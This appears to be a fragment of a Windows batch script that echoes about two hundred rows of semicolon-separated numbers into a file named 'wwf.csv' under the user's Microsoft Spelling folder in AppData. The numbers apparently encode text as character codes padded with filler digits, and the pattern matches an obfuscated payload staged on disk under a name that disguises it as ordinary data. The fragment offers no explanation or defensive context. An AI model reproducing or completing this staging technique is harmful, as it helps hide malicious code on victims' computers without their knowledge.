>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.815;32.2810;439.67;583.39;632.40;7604.767;35.341;46.532;83.9277;804.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.116;332.102;2175.811;114.809;32.805;115.7483;332.39;347.108;758.39;8166.346;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.441;32.532;32.6473;532.32;632.32;532.32;0034.432;32.432;32.632;32.4206;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.32;332.32;332.32;3450.332;32.432;45.732;77.4625;373.83;567.69;376.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8881.465;78.469;79.585;83.1457;732.45;71.75;547.104;8092.801;108.812;32.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.8002;532.32;532.32;632.32;9869.532;32.732;32.532;32.6133;732.32;432.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.32;0099.332;32.368;105.815;112.1111;808.97;821.32;816.104;0235.805;115.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.815;97.5579;803.101;532.109;801.115;1144.815;97.803;101.346;32.5013;783.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;816.32;9080.802;111.814;109.332;105.0315;815.32;739.47;563.39;2943.346;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.684;47.810;111.3345;808.111;803.111;532.32;7568.632;32.432;32.332;32.2934;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.32;532.32;532.32;5297.732;32.532;32.532;32.3090;432.83;817.112;812.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5691.801;115.815;32.599;111.1438;809.112;805.108;801.114;4934.532;99.811;112.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.6985;805.103;804.116;632.109;1523.801;115.815;97.803;101.8106;746.32;583.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;7346.816;32.802;111.814;109.1519;332.105;815.32;439.47;0318.810;39.646;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.773;47.6269;810.111;819.97;814.110;7694.432;32.632;32.732;32.8619;532.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;432.32;0259.332;32.432;32.432;32.8173;432.32;732.73;803.110;7697.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.801;32.399;111.4483;809.112;805.108;801.114;4154.632;119.397;114.810;105.3017;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.103;815.46;432.83;4468.804;111.814;116.432;102.7054;811.114;809.32;805.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5617.432;39.447;119.539;46.8293;41.55;547.110;811.99;9373.811;100.801;91.443;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(124.3584;445.93;332.32;432.32;2507.332;32.332;32.432;32.1507;432.32;432.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.32;5491.368;105.815;97.808;108.2331;811.119;532.99;811.100;9138.801;45.398;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.815;105.3440;800.101;332.109;811.100;8016.801;108.746;1.669;32.0431;432.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.32;632.32;4675.532;32.532;32.732;32.4344;632.32;432.32;632.32;1432.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.532;32.532;32.6066;632.32;632.84;804.101;5617.332;100.801;102.497;117.6638;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.116;532.105;815.32;5208.539;45.739;46.632;83.0011;804.111;814.116;532.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2968.811;114.809;32.805;115.2148;732.39;647.110;599.58;0458.639;46.61;50.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.2306;632.32;332.32;532.32;4538.432;32.632;32.632;32.2663;632.32;632.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.110;8378.800;111.819;115.532;87.4337;811.114;807.102;808.111;2362.819;32.667;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.809;112.0626;805.108;801.114;532.79;7962.812;116.805;111.810;115.4010;41.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;332.32;8514.532;32.732;32.732;32.7160;532.32;432.32;432.32;4260.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.332;32.732;32.0197;532.32;445.32;479.85;6045.584;80.585;84.732;70.0017;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(573.76;769.32;745.1;4699.744;47.811;117.816;58.4758;760.102;805.108;801.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7795.332;32.732;32.532;32.0447;732.32;332.32;632.32;1599.432;32.332;32.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.5988;817.116;812.117;816.32;0289.802;105.808;101.432;110.8076;397.109;801.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(825.47;9646.816;97.814;103.801;116.3036;658.97;815.115;801.109;6598.498;108.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.732;32.9549;532.32;332.32;632.32;0521.332;32.732;66.817;105.5145;808.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.97;632.87;6989.805;110.800;111.819;115.8957;732.87;811.114;807.102;9651.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.819;32.697;115.6719;815.101;809.98;808.121;2054.432;40.800;101.802;97.4581;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.108;816.41;746.13;5875.710;32.632;32.732;32.3583;332.32;632.32;532.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6721.432;32.532;32.732;32.1229;332.32;332.32;332.32;4508.532;32.632;32.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.8434;804.111;814.116;732.102;7969.811;114.809;58.532;47.1877;816.58;797.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.101;0338.809;98.808;121.41;102.6772;747.116;397.114;803.101;7843.816;58.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(120.801;9.3496;69.32;332.32;732.66;3378.817;105.808;100.532;97.6728;432.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.110;800.111;8065.819;115.432;87.811;114.8996;807.102;808.111;819.32;4512.497;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.812;108.805;99.6853;397.116;805.111;810.46;9885.713;10.732;32.632;32.1040;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;732.32;632.32;4186.332;32.632;32.532;32.8320;632.32;732.32;332.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5686.432;32.432;32.632;32.7367;783.104;811.114;816.32;9734.802;111.814;109.658;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.5618;747.116;458.101;820.101;7878.61;61.347;107.801;121.2562;802.105;808.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(358.60;7216.802;105.808;101.662;32.2408;632.32;432.32;732.32;1749.432;32.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.632;32.1490;583.112;801.99;805.102;9465.805;101.815;32.697;32.3933;815.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.111;810.103;2187.532;110.697;109.801;32.3954;807.101;821.32;802.105;5235.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.346;1.466;47.1444;807.101;821.99;811.110;6644.816;97.805;110.801;114.8511;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(458.60;815.116;814.105;7194.810;103.662;32.532;32.4433;332.32;732.83;812.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5455.399;105.802;105.801;115.6193;432.97;732.115;816.114;8608.811;110.803;32.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.4276;809.101;632.107;801.121;1399.532;99.811;110.816;97.5471;805.110;801.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.1;4001.481;47.800;101.808;97.0223;821.115;805.103;810.91;8262.443;124.645;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(93.732;32.7742;732.32;732.32;632.32;1106.332;32.532;32.532;68.3008;801.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.121;745.115;7643.805;103.810;32.816;104.0361;801.32;597.115;815.101;0958.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.808;121.432;117.5829;815.105;810.103;532.111;1855.810;108.821;32.816;104.0965;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.32;812.117;798.108;0965.805;99.332;112.811;114.7745;816.105;811.110;31.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5199.432;32.332;32.432;32.4940;332.32;632.32;632.32;0629.632;32.332;32.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.8880;632.32;332.32;532.32;9658.532;32.432;32.811;102.8535;532.116;804.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.115;2892.816;114.811;110.803;32.2345;810.97;809.101;632.107;8359.801;121.346;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.783;47.3318;814.111;811.116;810.97;3889.809;101.815;112.397;99.8649;801.58;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(460.115;816.114;2241.805;110.803;62.532;32.0342;432.32;632.83;812.101;9019.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.802;105.801;115.3157;532.116;804.101;332.114;8603.811;111.816;32.478;97.5644;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.101;815.112;397.99;5419.801;32.802;111.814;32.3972;397.108;808.32;816.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5952.812;101.732;100.801;99.7078;808.97;814.97;816.105;9448.811;110.815;46.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.5381;432.32;632.32;332.32;3659.332;32.732;32.532;32.9642;632.32;732.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;7936.732;32.532;32.432;32.6270;732.32;432.32;686.97;0604.808;105.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.811;110.4135;808.121;432.102;811.114;8059.632;39.386;66.339;32.8603;440.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.115;817.97;1393.808;32.566;97.815;105.5319;399.41;432.108;797.110;7177.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.697;103.801;46.9771;31.50;532.32;732.32;5861.532;32.332;32.532;32.3257;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;532.32;332.32;9937.632;32.632;32.732;32.1280;332.32;632.32;732.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0546.683;104.811;114.816;32.5521;802.111;814.109;332.105;9613.815;32.639;47.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.3590;815.58;539.46;71.77;5156.819;102.599;46.801;120.5991;801.32;660.88;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.109;9378.808;32.802;105.808;101.7714;432.108;805.115;816.62;1429.432;47.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.814;103.6226;801.116;458.97;815.115;7423.801;109.498;108.821;32.4219;691.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.98;647.99;6893.815;32.802;105.808;101.9434;732.108;805.115;816.62;9623.793;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.691;47.808;97.9833;810.103;817.97;803.101;5499.658;46.546;46.493;1.0372;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(675.32;732.32;632.32;8634.532;32.632;91.647;111.3260;817.116;458.46;746.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1372.693;32.691;47.814;101.2576;802.101;814.101;810.99;1511.801;58.446;46.746;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(93.2684;732.91;447.108;805.98;6649.814;97.814;121.558;46.2615;746.46;493.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(491.47;4174.800;101.698;117.803;46.5541;546.46;593.32;591.47;7558.810;111.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.800;101.2848;346.46;446.93;61.52;1796.332;32.432;32.432;32.5548;332.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(791.47;599.104;6610.801;99.807;116.821;112.9175;801.115;646.46;746.93;9426.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(91.747;114.801;115.8816;811.117;814.99;801.58;5085.360;114.801;115.811;117.0964;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.99;801.32;805.110;0862.802;111.462;93.41;90.5332;473.103;810.111;814.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8978.810;103.632;39.547;114.9397;811.111;816.110;797.109;3890.801;115.812;97.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.1514;358.123;648.125;739.46;7021.332;84.804;105.815;32.8996;815.119;805.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.104;0704.632;105.815;32.818;97.5687;808.105;800.32;811.110;8731.808;121.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.811;114.7066;432.39;786.66;639.32;7323.440;86.805;115.817;97.3631;808.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(466.97;815.105;9183.599;41.632;108.497;110.5427;803.117;397.103;801.46;3558.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(51.777;105.399;114.2484;811.115;811.102;816.32;1151.440;82.641;32.587;105.9540;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.100;811.119;815.32;2705.787;111.814;107.802;108.4948;811.119;432.67;811.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2165.812;105.808;101.814;32.4424;818.101;814.115;805.111;1717.810;32.823;48.825;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.9667;41.43;950.85;807.55;8934.770;224.860;102.800;140.1950;827.108;930.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(872.33;7782.803;239.876;150.392;177.0939;917.40;336.103;635.146;3924.936;49.612;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(75.860;85.1652;843.144;923.137;904.224;1292.813;11.887;60.760;113.4092;803.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(879.244;820.114;4320.911;103.35;1.437;10.0684;480.183;841.246;815.146;3441.882;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(182.358;5.723;13.1682;365.50;66.50;943.153;5600.904;142.902;201.519;45.7669;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(856.169;549.219;833.177;4554.561;88.432;186.875;31.6745;848.23;828.235;875.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3142.944;213.839;206.932;122.1731;952.99;806.145;650.74;0635.423;36.879;159.491;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(136.1899;833.212;905.105;840.97;1859.953;63.791;90.58;207.3464;827.5;937.197;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(939.121;0672.846;76.63;50.827;184.4101;821.176;343.23;832.112;8031.891;127.874;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(172.741;201.1734;891.165;485.42;71.67;1579.879;194.460;51.807;86.5909;834.183;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(657.196;881.76;6182.813;192.839;82.66;9.7435;836.157;861.142;48.129;5118.840;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(124.861;115.921;222.4053;877.168;945.18;873.15;1814.820;56.819;145.852;2.4442;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(953.121;735.144;852.90;5501.874;4.844;39.927;150.7375;841.192;875.92;365.75;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3817.877;157.471;151.579;152.1556;673.243;898.144;897.242;6291.873;186.336;45.832;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.7196;940.114;735.37;902.101;9172.941;250.532;189.861;95.9819;630.112;817.179;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(777.92;7471.70;0.60;0.917;6.6911;757.93;70.0;50.0;9709.52;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.332;0.8652;60.0;860.238;40.0;9738.860;208.30;0.482;83.1727;568.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(893.180;680.241;2755.849;228.830;69.872;33.1351;914.6;426.86;805.50;1233.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.819;102.6371;699.46;812.100;698.0;1317.70;0.40;0.70;0.4460;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;40.0;30.0;0040.70;0.50;0.30;0.9263;60.0;30.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2403.40;0.60;0.70;0.1715;70.0;70.0;40.0;0339.60;0.30;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4655;70.0;40.0;50.0;9984.30;0.40;0.40;0.2602;60.0;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;3876.40;0.60;0.60;0.6031;70.0;60.0;70.0;4701.30;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.8324;50.0;40.0;60.0;9719.70;0.60;0.60;0.7788;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;50.0;8324.50;0.30;0.30;0.6684;30.0;70.0;50.0;4991.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.30;0.8262;40.0;40.0;30.0;9985.50;0.40;0.70;0.7189;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;70.0;40.0;6027.50;0.50;0.70;0.2843;60.0;30.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4942.30;0.50;0.50;0.0677;50.0;30.0;50.0;1541.30;0.40;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8625;40.0;60.0;40.0;2396.40;0.40;0.30;0.4028;50.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;7527.40;0.40;0.40;0.3360;50.0;50.0;50.0;1748.40;0.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.5757;40.0;40.0;70.0;0356.50;0.60;0.30;0.6844;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;50.0;4130.40;0.70;0.30;0.3538;70.0;40.0;40.0;2145.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.60;0.4573;70.0;40.0;40.0;6791.30;0.60;0.40;0.0076;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;70.0;50.0;7409.928;239.70;0.60;0.5114;50.0;40.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7024.954;239.40;0.60;32.5213;40.0;70.0;60.0;2042.60;0.60;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2793;60.0;60.0;60.0;0704.70;0.40;0.940;239.5482;40.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;4449.60;0.40;0.40;0.1697;595.67;811.114;669.120;0846.801;77.497;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.810;0.4510;809.115;699.111;814.101;0714.801;46.800;108.808;0.9487;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;955.37;7850.40;32.364;0.50;0.0796;70.0;60.0;70.0;7613.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.50;0.4627;40.0;70.0;30.0;2894.50;0.40;0.30;0.3336;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;60.0;60.0;0866.50;0.70;0.30;0.4908;50.0;60.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9601.60;0.70;0.40;0.7556;50.0;40.0;50.0;1778.70;0.70;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6837;60.0;60.0;30.0;0116.50;0.70;0.40;0.5484;60.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;6859.40;0.30;0.70;0.4382;70.0;60.0;50.0;2697.50;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.5335;60.0;30.0;30.0;4321.30;0.30;0.40;0.3792;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;60.0;9998.40;0.50;0.40;0.7461;30.0;70.0;50.0;6490.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.40;0.7198;50.0;60.0;60.0;7987.30;0.70;0.40;0.2836;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;50.0;40.0;8856.40;0.50;0.50;0.9673;50.0;40.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9657.30;0.40;0.50;0.9214;70.0;40.0;30.0;6392.50;0.60;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5457;60.0;40.0;70.0;9870.60;0.60;0.40;0.4883;30.0;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;5052.40;0.50;0.50;0.6648;60.0;70.0;50.0;7934.40;0.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.50;0.6836;70.0;40.0;30.0;0330.60;0.70;0.40;0.8230;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;70.0;7688.50;0.50;0.30;0.2137;30.0;30.0;50.0;8438.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;0.60;0.5919;70.0;30.0;70.0;1126.70;0.70;0.50;0.8700;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;70.0;30.0;5547.50;0.50;0.60;0.5085;40.0;30.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6126.70;0.30;0.40;0.3932;40.0;40.0;50.0;1966.60;0.60;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6997;40.0;40.0;30.0;9220.40;0.60;0.30;0.5861;30.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;3136.50;0.60;0.60;0.1336;30.0;70.0;70.0;7299.30;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.1225;60.0;50.0;70.0;7501.60;0.60;0.40;0.8399;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;30.0;2176.30;0.50;0.60;0.8576;70.0;50.0;60.0;0573.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.50;0.3214;70.0;60.0;30.0;1932.30;0.70;0.70;0.6511;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;40.0;40.0;2966.30;0.40;0.60;0.4178;60.0;70.0;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7828.70;0.30;0.50;0.9178;30.0;70.0;40.0;8048.40;0.40;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0879;70.0;40.0;50.0;3884.60;0.30;0.40;0.1372;50.0;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;3135.40;0.60;0.60;0.3812;60.0;40.0;40.0;0995.30;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.30;0.3262;30.0;50.0;60.0;8739.70;0.30;0.30;0.6875;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;50.0;2398.70;0.70;0.30;0.4760;50.0;60.0;70.0;0270.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.70;0.9019;40.0;70.0;40.0;4824.30;0.30;0.50;0.7697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.0;516.0;70.0;1603.432;0.30;128.524;0.3546;50.0;580.0;30.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2423.60;0.70;0.30;0.9826;70.0;60.0;30.0;7548.30;0.51;0.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5839;60.0;756.0;40.128;6781.40;0.40;0.40;0.5732;70.0;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;8710.60;0.51;0.49;4.7356;70.0;828.0;50.0;5940.40;0.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.2980;40.0;40.0;40.0;6656.70;0.61;0.61;0.4503;30.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.0;70.128;6076.70;0.50;0.30;0.5521;70.0;60.0;40.0;6184.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.51;0.79;4.4470;70.0;832.4;70.0;7847.844;0.71;0.944;3.5890;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;30.0;50.0;7689.40;0.50;0.944;3.0917;552.0;40.0;386.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0147.783;0.795;0.786;0.3844;569.0;782.0;483.0;5144.373;0.479;0.378;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0736;695.0;573.0;778.0;8522.370;0.479;0.40;0.7973;40.0;889.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(939.254;2212.60;0.41;0.38;0.6714;34.0;40.0;788.15;1035.50;0.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;0.1899;811.118;363.0;50.0;1301.58;0.30;0.74;0.7726;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.0;30.0;2376.30;0.40;0.40;0.6013;40.0;50.0;30.0;8414.582;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.40;0.41;0.5902;483.0;816.0;814.0;3807.805;0.810;0.803;0.7552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(670.0;805.0;808.0;9707.801;0.673;0.810;0.6904;802.0;811.0;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3362.346;3.30;0.41;0.6385;548.0;752.0;548.0;9665.457;0.548;0.352;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3946;566.0;748.0;70.0;5364.476;0.722;0.71;0.1847;567.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.0;4619.812;0.697;0.810;0.5416;821.0;578.0;397.0;2946.809;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;0.6810;30.0;377.0;805.0;0424.599;0.814;0.811;0.5344;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;802.0;9701.816;0.532;0.767;0.0657;811.0;814.0;812.0;9952.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.797;0.3680;816.0;805.0;811.0;2063.810;0.50;0.834;0.8996;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(447.0;31.0;670.0;5964.805;0.808;0.801;0.4801;768.0;801.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7224.399;0.814;0.805;0.9632;812.0;816.0;805.0;8805.811;0.810;0.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9323;60.0;577.0;805.0;2999.699;0.814;0.811;0.1482;815.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;9480.816;0.332;0.387;0.8998;805.0;810.0;800.0;1095.811;0.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.815;0.7483;532.0;687.0;811.0;3268.814;0.807;0.802;0.2162;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;819.0;8480.332;0.570;0.811;0.2417;817.0;810.0;800.0;5233.397;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.805;0.5635;811.0;810.0;632.0;3946.367;0.811;0.809;0.3272;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;805.0;808.0;8505.801;0.814;0.60;0.8430;40.0;494.0;531.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8355.31;0.770;0.805;0.3437;808.0;801.0;686.0;3740.801;0.814;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5886;805.0;811.0;810.0;6485.40;0.50;0.452;0.1218;546.0;556.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.0;0623.551;0.657;0.550;0.6766;456.0;546.0;548.0;8677.432;0.398;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.2558;805.0;808.0;816.0;3507.332;0.698;0.821;0.0552;558.0;
